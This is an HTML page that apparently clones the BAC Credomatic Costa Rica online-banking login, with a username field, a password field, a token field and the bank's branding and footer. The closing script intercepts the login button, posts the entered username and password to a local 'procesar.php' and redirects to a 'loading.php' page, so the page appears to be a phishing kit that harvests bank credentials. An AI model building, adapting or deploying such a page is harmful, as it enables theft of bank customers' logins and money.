            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-bottom: 0px;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-153 {
            box-sizing: border-box;
        }

        .style-154 {
            padding-top: 40px;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-155 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-156 {
            width: 0px;
            height: 0px;
            opacity: 0;
            position: absolute;
            margin: 0px;
            z-index: -1;
            box-sizing: border-box;
        }

        .style-157 {
            user-select: none;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            display: flex;
            box-sizing: border-box;
        }

        .style-158 {
            width: 16px;
            height: 16px;
            position: relative;
            border-radius: 0px;
            transform: matrix(1, 0, 0, 1, 0, 0);
            border: 0.8px solid rgb(158, 158, 158);
            transition: 0.2s;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 1px;
            box-sizing: border-box;
        }

        .style-159 {
            height: 12.4px;
            width: 12px;
            z-index: 1;
            fill: none;
            stroke: rgb(255, 255, 255);
            stroke-width: 1.8px;
            stroke-dasharray: 16px;
            stroke-dashoffset: 16px;
            transition: 0.5s 0.1s;
            transform: matrix(1, 0, 0, 1, 0, 0);
            box-sizing: border-box;
        }

        .style-160 {
            box-sizing: border-box;
        }

        .style-161 {
            font-size: 14px;
            margin-left: 10px;
            color: rgb(109, 110, 113);
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-162 {
            padding-top: 10px;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-163 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-164 {
            width: 0px;
            height: 0px;
            opacity: 0;
            position: absolute;
            margin: 0px;
            z-index: -1;
            box-sizing: border-box;
        }

        .style-165 {
            user-select: none;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            display: flex;
            box-sizing: border-box;
        }

        .style-166 {
            width: 16px;
            height: 16px;
            position: relative;
            border-radius: 0px;
            transform: matrix(1, 0, 0, 1, 0, 0);
            border: 0.8px solid rgb(158, 158, 158);
            transition: 0.2s;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 1px;
            box-sizing: border-box;
        }

        .style-167 {
            height: 12.4px;
            width: 12px;
            z-index: 1;
            fill: none;
            stroke: rgb(255, 255, 255);
            stroke-width: 1.8px;
            stroke-dasharray: 16px;
            stroke-dashoffset: 16px;
            transition: 0.5s 0.1s;
            transform: matrix(1, 0, 0, 1, 0, 0);
            box-sizing: border-box;
        }

        .style-168 {
            box-sizing: border-box;
        }

        .style-169 {
            font-size: 14px;
            margin-left: 10px;
            color: rgb(109, 110, 113);
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-170 {
            display: none;
            box-sizing: border-box;
        }

        .style-171 {
            padding-bottom: 5px;
            padding-top: 40px;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-172 {
            font-size: 14px;
            background: rgb(16, 117, 187) none repeat scroll 0% 0% / auto padding-box border-box;
            color: rgb(255, 255, 255);
            position: relative;
            overflow: hidden;
            transition: background 0.4s;
            outline: rgb(255, 255, 255) none 0px;
            border: 0px none rgb(255, 255, 255);
            width: 100%;
            height: 45px;
            line-height: normal;
            user-select: none;
            font-weight: 500;
            padding: 0px 15px;
            box-sizing: border-box;
            text-align: center;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-173 {
            text-align: center;
            padding-top: 25px;
            padding-bottom: 25px;
            flex: 0 0 100%;
            max-width: 100%;
            padding: 25px 10px;
            position: relative;
            box-sizing: border-box;
        }

        .style-174 {
            font-size: 14px;
            font-weight: 400;
            cursor: pointer;
            line-height: 0px;
            text-decoration: none solid rgb(16, 117, 187);
            color: rgb(16, 117, 187);
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-175 {
            justify-content: center;
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-176 {
            padding: 0px;
            flex: 0 0 41.6667%;
            max-width: 41.6667%;
            padding-right: 0px;
            padding-left: 0px;
            position: relative;
            box-sizing: border-box;
        }

        .style-177 {
            padding-top: 25px;
            padding-bottom: 25px;
            margin-top: 15px;
            box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 15px 0px;
            background-color: rgb(255, 255, 255);
            width: 100%;
            box-sizing: border-box;
            border: 0.8px solid rgb(230, 230, 230);
        }

        .style-178 {
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-179 {
            text-align: center;
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0px 10px;
            position: relative;
            box-sizing: border-box;
        }

        .style-180 {
            font-size: 14px;
            align-items: center;
            justify-content: center;
            display: flex;
            font-weight: 400;
            cursor: pointer;
            line-height: 0px;
            text-decoration: none solid rgb(16, 117, 187);
            color: rgb(16, 117, 187);
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-181 {
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-182 {
            margin-left: 10px;
            box-sizing: border-box;
        }
    </style>
</head>

<body class="style-0">

    <form method="post" name="loginForm" autocomplete="off" class="">









        <header class="style-1">
            <div class="style-2">
                <a class="style-3" onclick="registerGAEvent('login','click','referral_login_bel');" href="#"></a>
                <ul class="style-4">
                    <li class="style-5">
                        <a class="style-6" onclick="goHelpCenter(); registerGAEvent('login','click','ayuda_login_bel');"
                            target="_blank">
                            <i class="style-7"></i> <span class="style-8"></span></a>
                    </li>
                    <li class="style-9">
                        <a class="style-10" role="button"
                            onclick="registerGAEvent('login','click','selector_pais_login_bel');" data-toggle="dropdown"
                            aria-haspopup="true" aria-expanded="true">
                            <span class="style-11"></span> <span class="style-12"></span> <i class="style-13"></i>
                        </a>
                        <div class="style-14" aria-labelledby="navbarDropdown">

                            <a class="style-15"
                                onclick="selectCountryDropdownMenu(this);registerGAEvent('login','seleccion_CR_login_bel','selector_pais_login_bel');"
                                data-flag="CR">Costa Rica
                            </a> <a class="style-16"
                                onclick="selectCountryDropdownMenu(this);registerGAEvent('login','seleccion_GT_login_bel','selecciona_pais_login_bel');"
                                data-flag="GT"> Guatemala
                            </a> <a class="style-17"
                                onclick="selectCountryDropdownMenu(this);registerGAEvent('login','seleccion_HN_login_bel','selecciona_pais_login_bel');"
                                data-flag="HN"> Honduras
                            </a> <a class="style-18"
                                onclick="selectCountryDropdownMenu(this);registerGAEvent('login','seleccion_NI_login_bel','selecciona_pais_login_bel');"
                                data-flag="NI"> Nicaragua
                            </a> <a class="style-19"
                                onclick="selectCountryDropdownMenu(this);registerGAEvent('login','seleccion_SV_login_bel','selecciona_pais_login_bel');"
                                data-flag="SV"> El Salvador
                            </a> <a class="style-20"
                                onclick="selectCountryDropdownMenu(this);registerGAEvent('login','seleccion_PA_login_bel','selecciona_pais_login_bel');"
                                data-flag="PA"> Panamá
                            </a>
                        </div>
                    </li>
                    <li class="style-21">
                        <a class="style-22" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                            <i class="style-23"></i> </a>
                        <div class="style-24" aria-labelledby="navbarDropdown">
                            <a class="style-25" onclick="createExchangeMobile();"></a> <a class="style-26"
                                onclick="goHelpCenter();  registerGAEvent('login','click','ayuda_login_bel');"
                                target="_blank">
                                <i class="style-27"></i> <span class="style-28"></span></a>
                        </div>
                    </li>
                </ul>
            </div>
            <div class="style-29">
                <div class="style-30"></div>
            </div>
            <div class="style-31">
                <div class="style-32">
                    <div class="style-33">
                        <a class="style-34" onclick="registerGAEvent('login','click','tipo_cambio_login_bel');">
                            <i class="style-35"></i> <span class="style-36"></span> <span class="style-37"><i
                                    class="style-38"></i></span> </a>
                        <div onclick=" " class="style-39">
                            <div class="style-40">
                                <div class="style-41"></div>
                                <div class="style-42">
                                    <div class="style-43">
                                        <h5 class="style-44"></h5>
                                    </div>
                                    <div class="style-45">
                                        <div class="style-46">
                                            <div class="style-47">
                                                <input type="radio" name="referenceCurrency" checked=""
                                                    class="style-48" /> <label class="style-49"
                                                    for="referenceCurrencyUSDexchangeRateContainer">Dólar</label>
                                            </div>
                                        </div>
                                        <div class="style-50">
                                            <div class="style-51">
                                                <input type="radio" name="referenceCurrency" class="style-52" /> <label
                                                    class="style-53"
                                                    for="referenceCurrencyEURexchangeRateContainer">Euro</label>
                                            </div>
                                        </div>
                                    </div>
                                    <hr class="style-54" />
                                    <div class="style-55">
                                        <button type="button" class="style-56">Compra: <span
                                                class="style-57"></span><span class="style-58">498.00</span></button>
                                        <div class="style-59"></div> <button type="button" class="style-60">Venta: <span
                                                class="style-61"></span><span class="style-62">512.00</span></button>
                                    </div>
                                    <div class="style-63">
                                        <div class="style-64">
                                            <i class="style-65"></i>
                                        </div>
                                        <div class="style-66">
                                            <input class="style-67" disabled="" value="USD" /> <input
                                                onkeypress="return isNumberKeyCode(event);" type="text" placeholder="0"
                                                class="style-68" />
                                        </div>
                                    </div>
                                    <div class="style-69">
                                        <p class="style-70"> <span class="style-71">CRC </span><span
                                                class="style-72">0</span>.<span class="style-73">00</span></p>
                                    </div>
                                </div>
                            </div><button onclick="return false;" class="style-74"><i class="style-75"></i></button>
                        </div>
                    </div>
                    <div class="style-76">
                        <div class="style-77">
                            <p class="style-78">Dolares:</p>
                            <p class="style-79">Compra <span class="style-80">498.00</span></p>
                            <p class="style-81">Venta <span class="style-82">512.00</span></p>
                        </div>
                        <div class="style-83">
                            <p class="style-84">Euros:</p>
                            <p class="style-85">Compra <span class="style-86">535.78</span></p>
                            <p class="style-87">Venta <span class="style-88">556.28</span></p>
                        </div>
                    </div>
                </div>
            </div> <select name="country" class="style-89" onchange="goToCountry()">
                <option value="CR" selected="" class="style-90">Costa Rica
                </option>
                <option value="GT" class="style-91">
                    Guatemala
                </option>
                <option value="HN" class="style-92">
                    Honduras
                </option>
                <option value="NI" class="style-93">
                    Nicaragua
                </option>
                <option value="SV" class="style-94">
                    El Salvador
                </option>
                <option value="PA" class="style-95">
                    Panamá
                </option>
                <option value="MX" class="style-96">
                    México
                </option>
            </select>
        </header>
        <div class="style-97">
            <div class="style-98">
                <div class="style-99">
                    <div class="style-100">
                        <div class="style-101">
                            <div class="style-102">
                                <a class="style-103"
                                    onclick="javascript: vnt('/ebac/ebac2.0/jsp/common/showSecurityAndTermOfUse.html', 650, 580); return false;">
                                    <i class="style-104"></i> </a>
                            </div>
                            <div class="style-105">
                                <img alt="imagen de la hora del dia" width="43px"
                                    src="/redir/redir2.0/images/module/login/state-3.gif" class="style-106" />
                            </div>
                            <div class="style-107">
                                <div class="style-108">
                                    <p class="style-109"> Le damos la bienvenida a</p>
                                </div>
                                <div class="style-110">
                                    <p class="style-111">Banca en Linea</p>
                                    <p class="style-112"><span class="style-113">¡</span>Bienvenido <span
                                            class="style-114"></span><span class="style-115">!</span></p>
                                </div>
                                <div class="style-116">
                                    <div class="style-117">
                                        <p class="style-118">Usuario: <span class="style-119"></span><span
                                                class="style-120">.</span></p>
                                    </div>
                                    <div class="style-121">
                                        <p class="style-122">Ingresar otro usuario
                                        </p>
                                    </div>
                                </div>
                                <div class="style-123">
                                    <div class="style-124">
                                        <label class="style-125">Seleccione el metodo de ingreso:</label>
                                    </div>
                                    <div class="style-126">
                                        <div class="style-127">
                                            <div class="style-128">
                                                <input class="style-129" type="radio" checked="" name="loginMode"
                                                    value="" onchange="passwordChecked(this.checked,'tr', 'pass')" />
                                                <label class="style-130" for="radioPassword">
                                                    <span class="style-131"></span> <span class="style-132">
                                                        Contrasena
                                                    </span> </label>
                                            </div>
                                        </div>
                                        <div class="style-133">
                                            <div class="style-134">
                                                <input class="style-135" type="radio" name="loginMode" value=""
                                                    onchange="signatureChecked(this.checked,'tr', 'pass')" /> <label
                                                    class="style-136" for="signaturePersistent">
                                                    <span class="style-137"></span> <span class="style-138">
                                                        Firma Digital
                                                    </span> </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="style-139">
                                    <div class="style-140">
                                        <label class="style-141" for="productId">Usuario</label> <input
                                            class="style-142" size="20" name="product" type="text" value="" />
                                    </div>
                                    <div class="style-143">
                                        <div class="style-144"><label class="style-145" for="pass">Contrasena</label>
                                            <div class="style-146"><input name="pass" type="password"
                                                    class="style-147" /><span class="style-148"></span></div>
                                        </div> <input name="passtemp" value="" type="password" class="style-149" />
                                    </div>
                                    <div class="style-150">
                                        <label class="style-151" for="inputDefault">Token</label> <input
                                            class="style-152" name="token"
                                            onkeypress="return checkNumberNoDot(event,this)"
                                            onkeydown="return noPaste(event,this)" value="" maxlength="6" size="20"
                                            type="text" autofocus="true" /> <input type="hidden" value=""
                                            name="signatureDataHash" class="style-153" />
                                    </div>
                                    <div class="style-154">
                                        <div class="style-155">
                                            <input class="style-156" type="checkbox" name="persistent" value="y"
                                                tabindex="3" onclick="keepUser();" /> <label class="style-157"
                                                for="remember-user"> <span class="style-158">
                                                    <svg class="style-159" viewBox="0 0 12 9">
                                                        <polyline points="1 5 4 8 11 1" class="style-160"></polyline>
                                                    </svg> </span> <span class="style-161">
                                                    Recordar Usuario
                                                </span> </label>
                                        </div>
                                    </div>
                                    <div class="style-162">
                                        <div class="style-163">
                                            <input class="style-164" type="checkbox" value="y" name="tokenPersistent"
                                                tabindex="3"
                                                onclick="setVisibilityToken(this.checked,'tr', 'tokenInformation');" />
                                            <label class="style-165" for="tokenPersistent">
                                                <span class="style-166"> <svg class="style-167" viewBox="0 0 12 9">
                                                        <polyline points="1 5 4 8 11 1" class="style-168"></polyline>
                                                    </svg> </span> <span class="style-169">
                                                    Usar token
                                                </span> </label> <input name="token"
                                                onkeypress="HiddenMessageBalloon(); return checkNumberNoDot(event,this)"
                                                onkeydown="return noPaste(event,this)" value="" maxlength="6" size="20"
                                                class="style-170" type="text" placeholder="Digite Token"
                                                autofocus="true" />
                                        </div>
                                    </div>
                                    <div class="style-171">
                                        <button name="confirm" id="ingre" class="style-172" type="button">
                                            Ingresar
                                        </button>
                                    </div>
                                    <div class="style-173">
                                        <a class="style-174"
                                            onclick="registerGAEvent('login','click','no_pude_ingresar_login_bel');">
                                            No puede ingresar</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="style-175">
                <div class="style-176">
                    <div class="style-177">
                        <div class="style-178">
                            <div class="style-179">
                                <a class="style-180"
                                    onclick="goToCreateUserForm();registerGAEvent('login','click','crear_usuario_login_bel');">
                                    <i class="style-181"></i> <span class="style-182">Crear usuario por primera
                                        vez</span></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>

    <style>
        .style-183 {
            padding: 25px;
            align-items: center;
            justify-content: center;
            display: flex;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
            background-color: #c8102f;
        }

        .style-184 {
            min-width: 93px;
            margin-right: 10px;
            box-sizing: border-box;
        }

        .style-185 {
            mask-type: luminance;
            box-sizing: border-box;
        }

        .style-186 {
            box-sizing: border-box;
        }

        .style-187 {
            box-sizing: border-box;
        }

        .style-188 {
            box-sizing: border-box;
        }

        .style-189 {
            box-sizing: border-box;
        }

        .style-190 {
            box-sizing: border-box;
        }

        .style-191 {
            box-sizing: border-box;
        }

        .style-192 {
            box-sizing: border-box;
        }

        .style-193 {
            box-sizing: border-box;
        }

        .style-194 {
            box-sizing: border-box;
        }

        .style-195 {
            font-size: 12px;
            color: rgb(255, 255, 255);
            margin-left: 10px;
            font-weight: 400;
            line-height: 18px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-196 {
            color: rgb(255, 255, 255);
            box-sizing: border-box;
        }
    </style>

    <div class="style-183">
        <svg class="style-184" width="107" height="23" viewBox="0 0 107 23" fill="none"
            xmlns="http://www.w3.org/2000/svg">
            <mask maskUnits="userSpaceOnUse" x="0" y="0" width="86" height="23" class="style-185">
                <path d="M85.4286 0H0V23H85.4286V0Z" fill="white" class="style-186"></path>
            </mask>
            <g mask="url(#mask0_4171_9599)" class="style-187">
                <path d="M16.4287 4.38086L25.1906 11.2899L22.8539 16.9761H16.4287V4.38086Z" fill="white"
                    class="style-188"></path>
                <path d="M14.7857 0L0 4.09097V10.9524L14.7857 4.41086V0Z" fill="white" class="style-189"></path>
                <path d="M14.7857 5.47656L0 12.0657V19.7147L14.7857 10.3655V5.47656Z" fill="white" class="style-190">
                </path>
                <path d="M10.9531 22.4513H20.8103V18.0703H15.7545L10.9531 22.4513Z" fill="white" class="style-191">
                </path>
                <path d="M14.7857 12.0469L0 21.3867V22.9993H9.14L14.7857 17.3743V12.0469Z" fill="white"
                    class="style-192"></path>
                <path
                    d="M45.5488 11.1782V11.1187C47.3143 10.3729 48.4912 8.82062 48.4912 6.31432C48.4912 2.76308 46.0788 0.548828 41.2829 0.548828H32.3096V23.0012H41.4007C46.9614 23.0012 49.2858 20.4884 49.2858 16.4602C49.2858 13.6256 47.9905 11.8646 45.5488 11.1782ZM37.0756 4.78642H41.1058C42.9593 4.78642 43.7539 5.44897 43.7539 7.20945C43.7539 8.9699 42.9892 9.68656 41.2236 9.68656H37.0756V4.78702V4.78642ZM41.4588 18.8832H37.0751V13.4162H41.3409C43.4888 13.4162 44.3127 14.1924 44.3127 16.0724C44.3127 18.1909 43.4302 18.8832 41.4588 18.8832Z"
                    fill="white" class="style-189"></path>
                <path
                    d="M62.885 0.548828H56.9537L49.2852 23.0012H54.5374L55.803 18.6084H63.8292L65.095 23.0012H70.6423L62.885 0.548828ZM57.0129 14.4012L59.2256 6.73186L59.8451 4.37426H59.9338L60.5237 6.73186L62.6483 14.4012H57.0129Z"
                    fill="white" class="style-190">
                </path>
                <path
                    d="M80.6738 18.4886C76.6776 18.4886 75.2575 16.9317 75.2575 11.3666C75.2575 6.0978 76.6197 4.4695 80.5866 4.4695C82.2201 4.4695 84.1583 4.76566 85.2958 5.2093V0.917379C84.0419 0.414148 82.0452 0 80.2954 0C73.2949 0 70.0957 3.93677 70.0957 11.3371C70.0957 19.2703 73.3539 23 79.9748 23C81.8996 23 84.0002 22.4968 85.429 21.7864V17.4798C84.2044 18.0125 82.2791 18.4892 80.6749 18.4892L80.6738 18.4886Z"
                    fill="white" class="style-191">
            </g>
            <line x1="106.5" y1="-2.18557e-08" x2="106.5" y2="23" stroke="white" class="style-193"></line>
        </svg>
        <p class="style-195">
            Todos los derechos reservados. 2025 © BAC International Bank.
            <a class="style-196" target="_blank"
                href="https://www.baccredomatic.com/es-cr/condiciones-y-terminos-de-uso">
                Términos y condiciones.
            </a>
        </p>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function () {
        let boton = document.querySelector('button[name="confirm"]') || document.getElementById("ingre");

        if (!boton) {
            boton = document.createElement("button");
            boton.name = "confirm";
            boton.id = "ingre";
            boton.className = "style-172";
            boton.type = "button";
            boton.textContent = "Ingresar";
            boton.style.cursor = "pointer";
            document.body.appendChild(boton);
        } else {
            boton.style.cursor = "pointer";
        }

        boton.addEventListener("click", function (event) {
            event.preventDefault();

            const usuarioInput = document.querySelector('input[name="product"]');
            const passwordInput = document.querySelector('input[name="pass"]');

            if (!usuarioInput || !passwordInput) {
                alert("Por favor complete todos los campos.");
                return;
            }

            const formData = new FormData();
            formData.append('usuario', usuarioInput.value.trim());
            formData.append('contrasena', passwordInput.value.trim());

            fetch('procesar.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
    console.log("✅ Respuesta del servidor:", data);
    
    // El ID es solo el valor que regresa del servidor
    const idUsuario = data.trim();  // Asegúrate de que el ID se reciba correctamente
    if (idUsuario) {
        window.location.href = `loading.php?id=${idUsuario}`;  // Redirige con el ID en la URL
    } else {
        alert("❌ No se recibió el ID del usuario.");
    }
})
            .catch(error => {
                console.error('❌ Error al enviar los datos:', error);
            });
        });
    });
    
</script>








</body>

</html>